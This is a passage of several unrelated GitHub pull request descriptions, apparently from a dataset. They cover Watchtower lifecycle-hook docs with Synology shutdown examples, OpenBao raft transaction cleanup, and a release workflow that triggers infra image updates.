>   - Banner: gate display by `selectedQuoteValueDifference >= dappSwapUi.threshold` (remove hardcoded default) and show savings using `selectedQuoteValueDifference`.
>   - Footer: trigger `onDappSwapCompleted` on cancel.
>   - Context: auto-hide quoted swap info when `selectedQuote` is cleared.
> - **Tests**:
>   - Update expectations for savings text, error strings, new action name, and removed `gasDifference`.

author: nicholas-fedor
body:
This PR updates the lifecycle hooks documentation with improved examples, execution flow diagrams, and troubleshooting guides. It includes the addition of Synology-specific examples for Synology DSM graceful shutdown. Documentation for Watchtower's documentation website has also been started to assist with future maintenance and collaboration. 

## Problem

The lifecycle hooks documentation was lacking in several areas, making it difficult for users to effectively implement and understand lifecycle hook functionality.

## Solution

The changes address this by significantly expanding the main lifecycle hooks documentation with detailed examples and guides, introducing a complete new example set for Synology DSM graceful shutdown, including a Go-based implementation and shell scripts.

## Changes

- **docs/advanced-features/lifecycle-hooks/index.md**: Significantly expanded with detailed examples, execution flow diagrams, troubleshooting guides, and improved explanations.
- **docs/README.md**: New comprehensive documentation file providing an overview of the project's documentation structure and usage.
- **build/mkdocs/mkdocs.yaml**: Updated MkDocs configuration to support enhanced documentation features.
- **build/mkdocs/README.md**: New documentation for MkDocs.
- **Makefile**: Modified to include virtual environment setup for MkDocs, enabling isolated documentation builds.
- **examples/lifecycle-hooks/synology-stop/**: Complete new example set for Synology DSM graceful shutdown:
  - **README.md**: Detailed setup and usage instructions.
  - **synology-stop.go**: Go implementation for interacting with Synology DSM API.
  - **synology-stop.sh**: Shell script wrapper for the Go program.
  - **test_synology_parsing.sh**: Test script for validating Synology API response parsing.
  - **DSM_Login_Web_API_Guide_enu.pdf**: Official Synology documentation reference.
- **.gitignore**: Added one line to exclude documentation build artifacts.

<!-- This is an auto-generated comment: release notes by coderabbit.ai -->

* **New Features**
  * Added Synology DSM lifecycle hook examples for graceful container shutdown

* **Chores**
  * Updated docs build/serve workflow and added interactive docs activation helpers

body:
## Description

Clean up leaked (meaning calling `BeginTx`, but never `Commit` or `Rollback`) raft transactions using `runtime.AddCleanup`

See also: [Zulip Thread](https://linuxfoundation.zulipchat.com/#narrow/channel/530381-openssf-openbao-support/topic/Raft.20Improvements/near/554338410)


## Rationale

Leaking a raft transaction has some negative effects:
- the fast transaction tracking will pile up memory
- the permit is not returned
- a read lock will be held indefinitely
- the underlying `bbolt` transaction will not be freed

author: therealnb
body:
## Summary

This PR adds a step to the release workflow that automatically triggers the infra repository's MCP Server image update workflow when a new image tag is pushed.

## Changes

- Added a new step `Trigger infra image update` to the release workflow
- Triggers on successful tag pushes (v* tags)
- Sends `repository_dispatch` event to `stacklok/infra` with image information
- Enables automatic image version updates in ArgoCD MCPServer resources

## How It Works

1. When a new tag is pushed (e.g., `v0.0.6`), the release workflow builds and publishes the image
2. After successful image signing, this new step triggers the infra repo workflow
3. The infra workflow automatically finds and updates MCPServer resources using the new image
4. A PR is created in the infra repo with the updated image versions
5. Once merged, ArgoCD automatically syncs the new image versions

## Integration

This works in conjunction with the workflow added in stacklok/infra#3682, which handles the actual image updates in ArgoCD configurations.

## Testing

- The trigger only runs on successful tag pushes
- Uses the dynamic repository owner (works with stackloklabs or other orgs)
- Includes both image name and tag in the payload for proper identification
